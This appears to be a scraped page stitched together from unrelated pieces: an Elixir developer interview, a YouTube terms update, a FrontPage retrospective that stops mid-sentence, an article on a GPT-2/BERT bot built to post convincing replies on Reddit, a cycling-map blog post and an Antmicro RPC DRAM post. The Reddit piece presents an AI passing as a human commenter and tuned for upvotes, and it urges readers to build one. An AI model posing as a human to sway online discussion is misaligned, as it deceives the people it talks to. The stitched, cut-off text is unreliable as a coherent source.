<p>If you have thoughts, comments or a hell yeah you want to share about this topic or maybe you want me to cover some specific part of my transition here, let me know either via <a href="mailto:lars@underjord.io">lars@underjord.io</a> or on Twitter <a href="https://twitter.com/lawik">@lawik</a>. My first thoughts and my build might just show up first on my newsletter, so consider signing up for that below. It don’t track. Thanks for reading.</p>

        <div id="post-body"><p>To say that Lars (a.k.a <a href="https://twitter.com/lawik">@lawik</a>) is only, as he describes himself, an “Elixir consultant with too much enthusiasm” will be an understatement. The guy is all over the place, writing software, helping businesses move forward, writing <a href="https://underjord.io/the-beam-marches-forward.html">inspiring stories</a> about the future of the BEAM, and co-hosting <a href="https://devchat.tv/podcasts/elixir-mix/">an Elixir podcast.</a> That is how I first got to know Lars. </p><p>Based in Sweden, Lars started his programming journey by building websites with Notepad, then learning PHP and eventually taking his hobby pro through contract work, a failed startup, a couple of product teams and onward into independent consulting. He lives along the west coast of Sweden - a little way out of the city, where he attempts to grow vegetables with his wife and baby. The baby is terrible at growing vegetables.</p><p>In 2016 Lars discovered Erlang/Elixir, and this changed his view on developing software.</p><h2 id="what-brought-you-to-elixir">What brought you to Elixir?</h2><p><strong>Lars:</strong> At first, it was a bit of hype. I had a colleague who was quite a good talker and he went on at length about the legendary resilience of Erlang and hot updates for buried telephone switches. He spoke very well of Ecto changesets and was generally, very positive about Elixir. I ended up looking at talks about Phoenix. This was when <a href="https://hexdocs.pm/phoenix/channels.html">Channels</a> was the new hotness and just before <a href="https://hexdocs.pm/phoenix/Phoenix.Presence.html">Presence</a> took the keynote stage. Looking at what the community was putting out made me give Elixir a try. When I went into business for myself, I was expecting to do a lot of Python, but I intended to try and get into Elixir.</p><p>I enjoy toying around with Raspberry Pi, so it was just a matter of time before I started playing with <a href="https://www.nerves-project.org/">Nerves</a>. I wanted to use the <a href="https://shop.pimoroni.com/products/inky-what?variant=21214020436051">Inky eInk</a> display with Nerves but the library was only available for Python. So, I decided to make a pure Elixir reimplementation. It proved to be a rabbit hole, but the Nerves community was very welcoming and helpful, and I was sold on Elixir for good. Love that crew!</p><p>I feel like I’ve written <a href="https://underjord.io/why-am-i-interested-in-elixir.html">at</a> <a href="https://underjord.io/why-am-i-still-excited-about-elixir.html">least</a> <a href="https://underjord.io/more-than-one-thing-at-a-time.html">four</a> <a href="https://underjord.io/the-beam-marches-forward.html">blog posts</a> about why I remain interested in and excited by Elixir and the BEAM. I like Python. I understand why people like Node.js but I can’t quite get excited about it. Either you go higher level on top of good abstractions, as the BEAM has, or you go lower level for unconstrained performance and flexibility.</p><h2 id="elixir-and-erlang-differ-significantly-from-other-mainstream-programming-languages-what-did-you-find-most-challenging-when-starting-with-the-stack">Elixir and Erlang differ significantly from other mainstream programming languages. What did you find most challenging when starting with the stack?</h2><p><strong>Lars:</strong> Immutability and the functional programming paradigm. Much of my early code did nothing or only did things by accident because I expected that the Map functions would mutate the map, not return a new one. Grasping map, reduce and all of their derivatives in the Enum module took me a bit. It was an adaptation process.</p><p>I guess it has also taken a while to disentangle <em>use</em>, <em>require</em>, <em>import</em> and <em>alias</em>. I still wouldn’t take bets on my understanding of <em>require</em> ;)</p><p>I’ve found the community incredibly welcoming at every step. I’ll call out <a href="https://twitter.com/nyaray">Emilio Nyaray</a> for helping me with some major refactoring and absorbing idiomatic Elixir. I hope everyone has such a good reception and it feels like the general feel of the community is very positive.</p><h2 id="tell-us-a-bit-about-your-most-recent-project-why-did-you-choose-elixir-for-it">Tell us a bit about your most recent project. Why did you choose Elixir for it?</h2><p><strong>Lars:</strong> A little while ago I made <a href="https://underjord.io/live-server-push-without-js.html">a very silly thing</a>. It is a way to show live information on a web page without using Javascript. Instead, it uses the <a href="https://en.wikipedia.org/wiki/Motion_JPEG">MJPEG</a> video protocol to deliver a new frame whenever the state changes. I used it to implement a live counter.</p><p>I used Plug and some code I found that the Nerves people had put together. The state is managed by a GenServer which keeps track of the connections as they come in, asking for the ”image”. It would add them to the list, render a new frame with some text on it, and send it to everyone connected. &nbsp;That would have been incredibly finicky in most runtimes. In my case, the biggest challenge was hitting the front page of Hacker News, where my Nginx config became a bottleneck for concurrent connections. I might have also needed to tweak my Plug a bit. It all maxed out at 450 or so concurrent connections, and I think it should be able to do way more.</p><p>I am about to add some upgrades to the <a href="https://beambloggers.com/">Beambloggers Webring</a> soon that follow the same vein. I don’t like running a database if I don’t need one. So the MJPEG thing is just in-memory data and a temporary state. I restart it, the connections are gone, and start building up again. Similarly, I want Beambloggers to bring in some fresh information about the different blogs. So I’ll have it run a GenServer that pulls in RSS feeds and parses out some recent items that I can link to. In-memory, background work.</p><p>Such use cases are something I’d hesitate to do in Python, for example. If I build something stateful in Python, I feel like it is bound to leak somewhere. Elixir and Erlang have abstractions that allow me to do such things with confidence.</p><h2 id="you-also-do-elixir-consulting-what-kinds-of-applications-do-your-clients-choose-the-beam-for-as-opposed-to-other-tech-stacks"><br>You also do Elixir consulting. What kinds of applications do your clients choose the BEAM for, as opposed to other tech stacks?</h2><p><strong>Lars: </strong>Distributed applications that run indefinitely. Those line up with the absolute majority of work I’ve ever done. Servers, services, and web applications. If I were building large amounts of CLI tooling, I wouldn’t pick it. If I needed native desktop bindings, I wouldn’t pick it. But generally, I’m in the web application world.</p><p>As the cultural successor to Ruby on Rails, I am seeing Phoenix being used all over the place and quite popular with startups. I have seen a lot of companies picking up Elixir without necessarily knowing much about OTP. I think this is fine, and mostly speaks to the maturity of Phoenix and Ecto that people don’t need to.</p><h2 id="in-the-era-of-kubernetes-and-microservices-where-do-you-see-monolithic-beam-applications-fit-into-the-picture">In the era of Kubernetes and Microservices, where do you see monolithic BEAM applications fit into the picture?</h2><p><strong>Lars:</strong> It is interesting. The way Erlang structures things in multiple <em>applications</em> on a <em>node</em> as part of a <em>cluster</em> brings in some infrastructure concerns. I think some people worry that this unconventional approach is a problem when working in a polyglot environment, for example. I don’t think so. Lots of people put the BEAM in their containers and ship it out to the Kubernetes cluster in the same way as every other stack. Microservices tend to be about the contracts you expose, not the internals of how the application runs. Therefore, the fact you run a BEAM application or even a cluster of BEAM applications as one service is perfectly fine.</p><p>Where I believe much of the power of BEAM is though, is if you don’t rely on microservices and a polyglot-heavy environment. You might then be able to cut off a lot of dead weight. Or at least, manage the complexity using tools you know, rather than write YAML until it goes away. Some of the tools are there by design; others are perhaps, what we should be building in the future. I’ve gotten into it to some extent in my blog post <a href="https://underjord.io/the-beam-marches-forward.html"><em>The BEAM marches forward.</em></a></p><p><br>For an in-between path, I would take a look at <a href="https://www.nomadproject.io/">Nomad</a> which seems to be a slightly lighter Kubernetes competitor that can run things without containers. I think it suits the BEAM very well, as Elixir releases handle many of the perks of containerization. I haven’t tried it but if you do, let me know. I am curious about how Nomad differs from Kubernetes.</p><h2 id="as-someone-listening-to-podcasts-for-over-15-years-i-can-t-help-but-ask-how-does-one-get-the-courage-to-host-a-podcast">As someone listening to podcasts for over 15 years, I can’t help but ask. How does one get the courage to host a podcast?</h2><p><strong>Lars:</strong> I don’t think I’m particularly brave. You should see how uncomfortable I am on ladders.</p><p>I think I picked up a habit of pressing through discomfort partly in my teens and partly running a startup with a mentor of mine. When I was around 14, my dad passed away, essentially a heart attack out of the blue. That experience totally shifted my threshold for pain or discomfort and deeply changed how I approached life. That change in attitude was probably part of why I was keen to do the startup. And the startup led to everything else. Turns out that running a business when I barely knew what I was doing as a technical lead was a constant exercise in being okay with discomfort.</p><p>I don’t recommend overworking. I don’t recommend burning yourself out on a startup. Yet, the discomfort is part of the learning sometimes. If you spend a lot of time outside your comfort zone, you are likely to learn more. Being aware that you are choosing discomfort and staying with it is powerful.</p><p>Oh, a podcast? Well, you get asked on as a guest and enjoy it. And then, when the OG host goes off to start a new one, you get contacted as one of the potential new hosts. And since you try not to worry too much and are willing to tackle discomfort, you fret about it for a bit, ask too many questions, and then give it a shot.</p><p><strong>Lars:</strong> It might feel daunting at first. Don’t feel pressure to understand the BEAM, Erlang, OTP, and all of that good stuff right away. If you are an inexperienced developer, any language can seem imposing. We all end up being beginners when we move over to a new ecosystem. I think we will all be happier if we concede that we will not master everything and will only learn a portion of it. What one should focus on instead is building software well.</p></div>

        <div><p>We periodically update our Terms of Service to make sure they are clear, easy to understand and meet the needs of our partners, advertisers and viewers. Starting today, we’re rolling out an updated Terms of Service in the United States. These new terms will be effective in countries outside of the United States in mid-year 2021. Please read through the <a href="https://www.youtube.com/t/terms">updated terms</a> carefully, they include the following changes.</p><p>First, our Terms of Service already expressly state that you are not allowed to “collect or harvest any information that might identify a person (for example, usernames), unless permitted by that person.” This has always included facial recognition data, and with today’s updated Terms of Service, we are making that explicitly clear.</p><p>Second, ads can now appear on videos from channels not in the YouTube Partner Program (YPP), and we will begin gradually placing ads on brand safe videos. This is part of our ongoing investments in new solutions, like Home Feed ads, that help advertisers responsibly tap into the full scale of YouTube to connect with their audiences and grow their businesses. Advertisers will continue to have full access to our brand suitability controls. Over the past three years, we improved our ability to identify appropriate placements for advertisers, in part by working closely with our advertising partners and <a href="https://wfanet.org/knowledge/item/2020/09/23/WFA-and-platforms-make-major-progress-to-address-harmful-content">industry organizations</a>. Because these channels are not in YPP, there is no creator revenue share, but creators can still apply to YPP once they hit the <a href="https://support.google.com/youtube/answer/72851?hl=en">eligibility criteria</a>, which remains the same.</p><p>Finally, for U.S. creators in YPP, our updated Terms state that any revenue payments from YouTube will now be treated as royalties from a U.S. tax perspective, and that Google will withhold taxes from these payments if it is required by law. U.S. creators will generally be unaffected by these withholding taxes as long as they provide valid tax documentation in <a href="https://support.google.com/adsense/answer/2490070?hl=en">Adsense</a>. For creators outside of the U.S., we will provide more details in 2021 as the terms become available in their countries.</p><p>You can view the previous Terms of Service and how it compares with this update in our <a href="https://yt.be/help/ToS20">help forum</a>.</p></div>

	<img src="https://invisibleup.com/articles/33/thumb.png" alt="FrontPage: The Good, The Bad, and The Ugly thumbnail">
	
	

	<p>PLEASE don't use FrontPage for modern web development! It's filled with security vulnerabilities and obsolete standards. The goal of this is not to convince you otherwise. The newest version came out almost two decades ago!</p>

<p>Microsoft FrontPage. The mere mention of that name is making most (if not all) of you seasoned web devs groan. "FrontPage was utter rubbish from dark ages of GeoCities" you say. "Everything it touched was ruined with horrific output and proprietary nonsense!" And yes, it was.</p>
<p>But... FrontPage as a concept. As a dream of what could have been, and a window into what <em>was</em>. Letting the typical home user at the time create websites, express creativity, and conquer the world by storm, all without being forced to learn HTML or CSS or JavaScript... In that regard, FrontPage couldn't be beat.</p>
<p>Let's talk about why Microsoft FrontPage was for a brief period of time the ultimate content creation tool of the Internet, and why it later fell from grace.</p>
<h2>History</h2>
<p>Before we can talk about goodness and ugliness, we need to talk about carphones and business meetings. Because this was 1994, when the Internet was still really new. At that point in time most internet chatter occured on Usenet groups (think something like Reddit) or BBS systems (think something like <a href="https://invisibleup.com//articles/5/">old AOL</a>; example pictured below). If you needed buisness stuff, like stocks or the such, you had to log onto the BBS of whoever had what you needed. This was kind of a pain.</p>
<p><img alt="A picture of a BBS (tilde.town) as of today" src="https://invisibleup.com//articles/33/BBS.png"></p>
<p>Enter Randy Forgaard and Charles H. Ferguson. Ferguson, renowned computer industry consultant, contacted MIT graduate Forgaard (over carphone, in case you were wondering) to discuss starting a new, internet-based company.</p>
<p>His idea was that many corporations such as the Dow Jones, Bloomberg, Apple, etc. were sinking millions into building their own, completely incompatible dial-in Internet services. Therefore, they should create a standardized, completely open server/client combo to replace all the independent efforts. This hopefully would reduce the cost of development for those corporations, and provide a market for growth by making buisnesses <em>want</em> to have an Interent presence.</p>
<p>The two decided to found their own company, Vermeer Technologies, Inc. A month later, still in the planning stages, they caught wind of the brand new World Wide Web out of CERN. It was decentralized, open, and even more robust than they were planning. It was just about perfect. The only issue was that it was rather a pain to make websites if you were just some lowly advertising manager or whoever. The web needed an authoring tool for websites.</p>
<p><img alt="FrontPage 1.0a, taken from WinWorldPC.com" src="https://invisibleup.com//articles/33/FP-1.0.png"></p>
<p>So, somehow, they managed to hire many professional coders for no salary whatsoever to work on FrontPage. (Early start-up culture, perhaps?) Evidently it worked, as FrontPage was released (only!) a week behind schedule on October of 1995. By then the World Wide Web was exploding, with a 20% increase in sites <em>per month</em>. FrontPage also managed to explode, receiving many awards and positive reviews. In fact, it was so good that Microsoft ended up buying them out. According to them, not only did it feel like a native Office application, it was perfect for their ongoing plan to become more internet centric.</p>
<p><img alt="FrontPage 97, taken from WinWorldPC.com" src="https://invisibleup.com//articles/33/FP-97.png"></p>
<p>FrontPage over the years got integrated into the Office suite and made a flagship product for Microsoft productivity products. By Office 2000, FrontPage had more Office integration than you should shake a stick at; nailing down the Office user interface and allowing imports and exports across the whole suite. There's... other stuff as well, but let's stay positive for now.</p>
<p>I'll be covering FrontPage 2002, as that's the version I own, and the one I have the most experience with.</p>
<h2>The Good</h2>
<p>The interface... is (in my opinion) one of the best interfaces for any program ever. No hyperbole. I think only the other Microsoft applications of the era like PowerPoint and Visio can top it. I can <em>see</em> why it won awards.</p>
<p><img alt="FrontPage's start screen with no webs open" src="https://invisibleup.com//articles/33/FP-Start.png"></p>
<p>Like any other Microsoft Office XP program, there's the sidebar on the right with common tasks. What you'll probably want to do is, of course, make a new site.</p>
<p>FrontPage's equivalent to "projects" are called "Webs". These Webs contain the files (all your HTML, CSS, images, etc.) and preferences (such as which web server to sync up with or what compatibility settings to use) for that website.</p>
<p><img alt="FrontPage's template selector" src="https://invisibleup.com//articles/33/FP-NewWeb.png"></p>
<p>Start by selecting a new "Empty Web". Up pops a bunch of templates, including the "Empty Web" template. A bit odd, but sure.</p>
<p><img alt="The &quot;Personal Homepage&quot; template in action" src="https://invisibleup.com//articles/33/FP-Template.png"></p>
<p>If you <em>were</em> to choose a template, it would give you a pre-populated fill-in-the-blanks site ready for your words and pictures. It takes some of the layout work and design originality out of it, but that <em>is</em> the purpose of a template after all. (Although, as a word of advice, <em>don't use these.</em> They're rather awfully designed from a web standards point of view. You can see it barely fitting in my window there. Imagine that on a smartphone.)</p>
<p><img src="https://invisibleup.com//articles/33/FP-BlankWeb.png" alt="FrontPage open to a new blank web. Folder list and Views bar are visible."></p>
<p>Anyways, once you open your blank web, you get... nothing! (That's what you asked for, isn't it?) No worries. Really, if you think about it, it would be rather silly to start making a page off the bat. You see, FrontPage takes a <em>project oriented</em> approach to things. While you easily <em>could</em> just sit down and start banging stuff out, that's really not the way FrontPage wants you to go.</p>
<p><img alt="FrontPage Navigation editor with some pages created and linked up." src="https://invisibleup.com//articles/33/FP-NavView.png"></p>
<p>Here's probably my favorite FrontPage feature: the Navigation editor. Here you create blank pages and link them together in a logical hierarchy. This closely resembles the process you'd usually take on paper when designing a website.</p>
<p><img alt="Navigation bar settings dialog" src="https://invisibleup.com//articles/33/FP-Navbar.png"></p>
<p>With this hierarchy, you can automatically create a navigation bar in all your pages that are properly linked. If you decide to make a new top-level page, for instance, every page on your site will be updated to feature that page. (To replicate that feature on this site, I had to use some pretty tricky template scripting with my custom Flask server. I'd vastly prefer something like this.)</p>
<p>This feature is also nice because it forces you to <em>think about your site</em>. You can't just sit down like it's Microsoft Word and bang out some pages. You need a coherent plan. Before you can even start, you need to sit down with your client/team/self and ask "What do you want on your website?" To most people it's obvious that you need a website. Everybody has a website. What's significantly less obvious is <em>what</em> needs to be on the website. And FrontPage's web editor allows you to play around with hierarchies and layouts before commiting to anything.</p>
<p><img alt="PowerPoint Slide Sorter mode&quot;" src="https://invisibleup.com//articles/33/PPT-SlideSorter.png"></p>
<p>One thing that's intersting is that Word, PowerPoint and Access all (vaguely) follow a similar model. Word has the Outline editor, PowerPoint has the Slide Sorter mode (pictured above, showing an interactive game I made when I was 11), and Access, being a typical database program, requires you to declare your tables before you can work on them.</p>
<p>What's even more interesting is that, with the exception of Access (which not many people used, mostly due to its cost and relative rarity), you were never <em>required</em> to have a plan before starting. Most people I've seen use Word just do straight typing, or perhaps work off another document with an outline. But the option was there! One could do their outline <em>in their document</em> and flesh out around that. Likewise with PowerPoint, as well.</p>
<p><img alt="Highlighted template include code" src="https://invisibleup.com//articles/33/FP-TemplateInclude.png"></p>
<p>Another common task in web design is defining a "template" page where you fill all your content into. For example, every page on this site you're reading on now has the same header and footer, and every article has the same sort of thumbnail image at the top. That was all scripted using template features.</p>
<p>FrontPage, being an Office product, supports templates. The implementation admittedly is <em>super</em> janky, but it's there. You can include pages within other pages just fine, it's just a little tricky to set up. (FYI, Word, Excel, and PowerPoint do templates too. It's one of their lesser-known features, IMHO.)</p>
<p><img alt="Report view window" src="https://invisibleup.com//articles/33/FP-Reports.png"></p>
<p>Another really neat feature: reports. Like a compiler in an IDE, FrontPage produces warnings, errors, and statistics for your site. At a glance I can view all broken links, orphaned pages, oversized images, etc. This is a <em>fantastic</em> feature, something that modern web dev software just <em>doesn't</em> have.</p>
<p><img alt="Hyperlinks view window" src="https://invisibleup.com//articles/33/FP-Links.png"></p>
<p>In the same vein as the Reports, you can see at a glance what links to what. It's a lot like the call chart in a software development IDE. I can see quickly every site linked from any page (shown here is <a href="https://invisibleup.com//articles/24/">the Sonic R color fix article</a>) and any subpages.</p>
<p><img alt="Tasks view, showing a task labeled &quot;Write FrontPage article&quot;" src="https://invisibleup.com//articles/33/FP-Tasks.png"></p>
<p>Last feature, although this isn't nearly as useful in the year 2020. In the tasks view, you can put up a list of tasks that needs to be accomplished. Already that seems rather nice for keeping track of what you need to do. It's a lot like GitHub or GitLab's issue tracker, in a sense.</p>
<p>However, if you connect to a server with FrontPage Web Extensions (I'll get to that...), you can share this task list with other people. You can (again, like an issue tracker) put up a task to be done by someone else and work on a task that somebody else put up. It's a <em>very</em> nice feature for web development, but nowadays this is normally handled by source control providers like GitHub or GitLab.</p>
<p><img alt="FrontPage editing the Sonic R color mod article" src="https://invisibleup.com//articles/33/FP-Editor.png"></p>
<p>And, of course, there's the webpage editor. This works almost exactly like Microsoft Word, with some web-flavored spice. You type words and they appear in the page. You make those words blue, they're blue. <em>That said</em>, when you edit elements like that, it inserts an HTML 3.2 style <code>&lt;FONT&gt;</code> tag instead of trying to match it to a CSS rule. There's ways around this, but you have to be very diligent in doing so. This is mostly just due to FrontPage being a product of its time, though.</p>
<p>FrontPage is a program about planning, executing, and reviewing. Take the Navigation editor. You plan out the content of your site. You sketch up the layout. Then you reflect on if your layout matches your requirements. Or the Reports. Create content, check reports. Or the Tasks. Plan out what you need to do, do that, and then check if the task is complete. That, right …</p></article></div>

<p>Sometimes I find these AI / programming hobby projects that I just wished I had thought of… </p>



<p><a href="https://www.linkedin.com/in/willstedden/"><strong>Will Stedden</strong></a> combined OpenAI’s <strong><a href="https://openai.com/blog/better-language-models/">GPT-2</a></strong> deep learning text generation model with another deep-learning language model by Google called <strong><a href="https://towardsdatascience.com/bert-explained-state-of-the-art-language-model-for-nlp-f8b21a9b6270">BERT</a></strong> (Bidirectional Encoder Representations from Transformers) and created an elaborate architecture that had one purpose: <strong><em>posting the best replies on Reddit.</em></strong></p>



<p>The architecture is shown at the end of this post — copied from Will’s original blog<em> <a href="https://www.bonkerfield.org/2020/02/combining-gpt-2-and-bert/">here</a></em>. Moreover, you can read&nbsp;<a href="https://www.bonkerfield.org/2020/02/reddit-bot-gpt2-bert/">this post</a>&nbsp;for details regarding the construction of the system. But let me see whether I can explain you what it does in simple language. </p>



<p>The below is what a Reddit comment and reply thread looks like. We have <em>str8cokane </em>making a comment to an original post (not in the picture), and then <em>tupperware-party</em> making a reply to that comment, followed by another reply by <em>str8cokane</em>. Basically, Will wanted to create an AI/bot that could write replies like <em>tupperware-party</em> that real people like <em>str8cokane</em> would not be able to distinguish from “real-people” replies.</p>



<p>Note that with 4 <strong>points</strong>, <em>str8cokane</em>‘s original comments was <em><strong>“liked”</strong></em> more than <em>tupperware-party</em>‘s reply and <em>str8cokane</em>‘s next reply, which were only <strong><em>upvoted </em></strong>2 and 1 times respectively.</p>



<figure><img src="https://www.bonkerfield.org/assets/images/2020/tupperware-party3.png" alt="gpt2-bert on China"><figcaption>Example reddit comment and replies (via <a href="https://www.bonkerfield.org/2020/02/combining-gpt-2-and-bert/">bonkerfield.org/</a>)</figcaption></figure>



<p>So here’s what the final architecture looks like, and my attempt to explain it to you.</p>



<ol><li>Basically, we start in the upper left corner, where Will uses a database (i.e. <em>corpus</em>) of Reddit comments and replies to fine-tune a standard, pretrained GPT-2 model to get it to be good at <strong>generating (red: “fake”) realistic Reddit replies</strong>. </li><li>Next, in the upper middle section, these fake replies are piped into a standard, pretrained BERT model, along with the original, real Reddit comments and replies. This way the BERT model sees both real and fake comments and replies. Now, <strong>our goal is to make replies that are undistinguishable from real replies</strong>. Hence, this is the task the BERT model gets. And we keep fine-tuning the original GPT-2 generator until the BERT discriminator that follows is no longer able to distinguish fake from real replies. Then the generator is “fooling” the discriminator, and we know we are generating fake replies that look like real ones! <br><em>You can find more information about such generative adversarial networks <a href="https://paulvanderlaken.com/2017/10/30/generative-adversarial-networks-gan-explained/">here</a>.</em></li><li>Next, in the top right corner, we fine-tune another BERT model. This time we give it the original Reddit comments and replies along with the amount of times they were upvoted (i.e. sort of like likes on facebook/twitter). Basically, we train a BERT model to <strong>predict for a given reply, how much likes it is going to get</strong>.</li><li>Finally, we can go to production in the lower lane. We give a real-life comment to the GPT-2 generator we trained in the upper left corner, which produces several fake replies for us. These candidates we run through the BERT discriminator we trained in the upper middle section, which determined which of the fake replies we generated look most real. Those fake but realistic replies are then input into our trained BERT model of the top right corner, which predicts for every fake but realistic reply the amount of likes/upvotes it is going to get. Finally, <strong>we pick and reply with the fake but realistic reply that is predicted to get the most upvotes!</strong></li></ol>



<figure><p><a href="https://www.bonkerfield.org/assets/images/2020/gpt2_bert_workflow.png"><img src="https://www.bonkerfield.org/assets/images/2020/gpt2_bert_workflow.png"></a>
</p><figcaption>What Will’s final architecture, combining GPT-2 and BERT, looked like (via <a href="https://www.bonkerfield.org/2020/02/combining-gpt-2-and-bert/">bonkerfield.org</a>)</figcaption></figure>



<p>The results are astonishing! Will’s bot sounds like a real youngster internet troll! Do have a look at <a href="https://www.bonkerfield.org/2020/02/combining-gpt-2-and-bert/">the original blog</a>, but here are some examples. Note that <em>tupperware-party</em> — the Reddit user from the above example — is actually Will’s AI. </p>



<figure><a href="https://www.reddit.com/r/sciencefiction/comments/evqiti/dune_logo_unveiled_at_event_copyright_claimants/fg44yzw/?context=3"><img src="https://www.bonkerfield.org/assets/images/2020/tupperware-party1.png" alt="COMMENT: 'Dune’s fandom is old and intense, and a rich thread in the cultural fabric of the internet generation' BOT_REPLY:'Dune’s fandom is overgrown, underfunded, and in many ways, a poor fit for the new, faster internet generation.'"></a></figure>



<figure><a href="https://www.reddit.com/r/BurningMan/comments/ep6pyq/playa_lung/feilsjn/?context=8&amp;depth=9"><img src="https://www.bonkerfield.org/assets/images/2020/tupperware-party2.png" alt="bot responds to specific numerical bullet point in source comment"></a></figure>



<p>Will ends his blog with <a href="https://www.bonkerfield.org/2020/02/reddit-bot-gpt2-bert/">a link to the tutorial</a> if you want to build such a bot yourself. Have a try!</p>



<p>Moreover, he also notes the ethical concerns:</p>



<blockquote><p>I know there are definitely some ethical considerations when creating something like this. The reason I’m presenting it is because I actually think it is&nbsp;<a href="https://www.wired.com/story/company-wants-billions-make-ai-safe-humanity/">better</a>&nbsp;for more people to know about and be able to grapple with this kind of technology. If just a few people know about the capacity of these machines, then it is more likely that those small groups of people can abuse their advantage.</p><p>I also think that this technology is going to change the way we think about what’s important about being human. After all, if a computer can effectively automate the paper-pushing jobs we’ve constructed and all the bullshit we create on the internet to distract us, then maybe it’ll be time for us to move on to something more meaningful.</p><p>If you think what I’ve done is a problem feel free to&nbsp;email me&nbsp;, or publically shame me on&nbsp;<a href="https://twitter.com/bonkerfield">Twitter</a>.</p><cite>Will Stedden via <a href="https://www.bonkerfield.org/2020/02/combining-gpt-2-and-bert/">bonkerfield.org/2020/02/combining-gpt-2-and-bert/</a></cite></blockquote>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>10.</p><div id="text">
				
				<p>We cycled the Swiss part of the Rhine Cycleway last week, with our <a href="https://www.bikefriday.com/bicycles/touring/1248">folding</a> <a href="http://airnimal.eu/products/chameleon/performance-sport/">bikes</a> neatly stowed in suitcases for the flight. A combination of <em><a href="http://cycle.travel/">cycle.travel</a></em> (natch), the Cicerone guide, and the excellent <a href="https://itunes.apple.com/gb/app/mapout/id477094081?l=en&amp;mt=8">MapOut</a> app guided us safely along the way: a very modern combination of mapping styles.</p><p>Wandering around Zürich, waiting for our flight home, I was intrigued by this cycle map in the window of a (closed) antiquarian bookstore:</p><p><img src="http://blog.systemed.net/images/original/strassenprofilkarte_1.jpg"></p><p>And if that isn’t clear enough from the pic snatched through a window, here’s a better excerpt from <a href="http://www.ak-ansichtskarten.de/shop/ak/46/back4684588/Rueckseite-Deutsche-Strassenprofilkarte-fuer-Radfahrer-Strassburg-und-Umgebung-Naumann-s-Fahrraeder-Seidel-Naumann-Dresden.jpg">an example</a> I found online:</p><p><img src="http://blog.systemed.net/images/original/strassenprofilkarte_2.jpg"></p><p>On major climbs, rather than strictly following the two-dimensional curves of the route as a conventional map would do, the map shows a miniature gradient profile for that particular hill.</p><p>Bending geometry to show a subjective view of space is nothing unusual. The Tube map (and its many imitators) famously do it, as do the one-dimensional strip maps that Laurence Penney has <a href="http://www.youshouldliketypetoo.com/blog/misc/one-dimensional-maps/">lovingly curated</a>&nbsp;(and, indeed, one of Laurence’s maps has a <a href="http://www.youshouldliketypetoo.com/wp-content/uploads/2012/12/one-dimensional-maps-14.jpg">passing resemblance</a> to these German sheets). But I’ve never seen quite this approach taken before. It’s a recognition that – just as distance is immaterial to the Tube passenger – to the cyclist, hills are as much part of the ‘distance travelled’ as are the ticking miles on the cycle computer.</p><p>Not that the Radfahrer in question would have had cycle computers, of course. There appear to have been 80 of these sheets, published by&nbsp;Mittelbach's Verlag of Leipzig with the co-operation and support of the national German cycling organisations <em>(unter Mitwirkung der Gauverbände des Deutschen Radfahrerbundes und der Konsulate der Allgemeinen Radfahrer-Union)</em>. They seem to date from the beginning of the 20th century, and are not yet collectable, if the <a href="http://www.abebooks.co.uk/Deutsche-Strassenprofilkarte-Radfahrer-Mitwirkung-Gauverb%C3%A4nde-Deutschen/6461038791/bd">prices on Abebooks</a> are anything to go by.</p><p>And in one of those curious coincidences…</p><p>I originally finished this post with “<span>I don’t expect to see a revival any day soon”, but the day after I posted this, Sustrans Midlands retweeted a link to <a href="https://twitter.com/Lunto_Sustrans/status/496934542880833536">exactly such a map</a>. This ‘Accessible Map’ of Queenstown, New Zealand, was particularly intended for wheelchair users and other people who find steep slopes challenging:</span></p><p><img src="http://blog.systemed.net/images/original/modern_elevation_map.jpg"></p><p><span>You can download the full map as a PDF from drcqueenstown.co.nz. The cartographer, Toby Eglesfield, has also written an <a href="http://www.tobyeglesfield.com/a-map-showing-the-steepness-of-streets/">extensive, well-illustrated blog post</a> explaining the design choices he made – and&nbsp;in the comments, two people raise the idea of generating such a map from OpenStreetMap data.

        <p>The Internet of Things is one of the areas that is hugely benefiting from miniaturization of semiconductor technologies, as more computing power can be encapsulated into increasingly smaller devices. Shrinking in size and requiring less power, various devices - including AI-capable ones - are applied in ways that were not possible a few years ago. One of the new and exciting developments in this space is the emergence of <a href="https://etronamerica.com/products/rpc-dram/">RPC (reduced pin-count) DRAM</a> - a small form factor memory, for which Antmicro has developed support in the open source memory controller, LiteDRAM. Our contribution, already made available on <a href="https://github.com/antmicro/litedram/tree/rpc-dram-support">GitHub</a> is being polished and undergoing final tests, and will be mainlined shortly.</p>

<h3 id="what-is-rpc-dram">What is RPC DRAM</h3>

<p>Standard modern DRAM chips, with their small but not miniscule footprints and rather high I/O requirements, are impossible to use in space-constrained applications. By using a large number of pins in the device they connect to, they can also push the envelope of the device itself even more, requiring larger and more expensive packages of the FPGA or SoC used. <br>
And while many edge devices could easily do with a smaller amount (e.g. sub-1Gb) of RAM than what modern memory parts offer, it is impossible to cut a RAM chip in half and get less memory capacity. Well, at least until now - kind of.</p>

<p>The so-called RPC (Reduced Pin Count) DRAM - a new technology from Etron - has the potential to profoundly impact the AI, IoT and VR/AR markets. It is a tiny memory chip family which can get as small as 1.96mm x 4.63mm, offering 256Mbits and high bandwidth (the same as DDR3) using only 10% of the DDR3 PCB area and only half of the SoC or FPGA pins that the DDR3 memory takes up. Its clock speed can go up to 1200MHz, with bandwidth of up to 4800 Mb/s.</p>

<p><img src="https://antmicro.com/blog/images/LiteDRAM_with_RPC_RAM_blog-note.png" alt="DDR RAM and RPC DRAM comparison"></p>

<p>RPC DRAM is ideal for space-constrained edge AI applications that locally process data such as video, audio or image, where, apart from space saving, low power consumption is critical. The small number of pins used by RPC DRAM leaves more available resources for other system functionalities, while the possibility of stacking multiple RPC DRAM chips on top of one another for further layout optimization makes the technology even more appealing. It also enables interesting scenarios like <a href="https://antmicro.com/blog/2020/10/open-chiplet-initiative/#future-developments">embedding in a chiplet-based SiP</a>, or even bare-die integration with small FPGAs for a powerful, Linux-capable device. But to use the memory with FPGAs, you need to interface with it using a DRAM controller - and that is where our latest work with LiteDRAM comes in.</p>

<h3 id="litedram-and-open-source-ip-ecosystem">LiteDRAM and open source IP ecosystem</h3>

<p>LiteDRAM is a configurable memory controller that is part of LiteX, an open source SoC builder that we are developing and using to design FPGA-based systems. By creating support for RPC DRAM in LiteDRAM we have enabled the miniscule memory to be added to products that we build and to the whole LiteX ecosystem. This enables our customer’s devices to run more compute-hungry applications or full-fledged operating systems such as Linux in dedicated SoCs created by Antmicro on demand.</p>

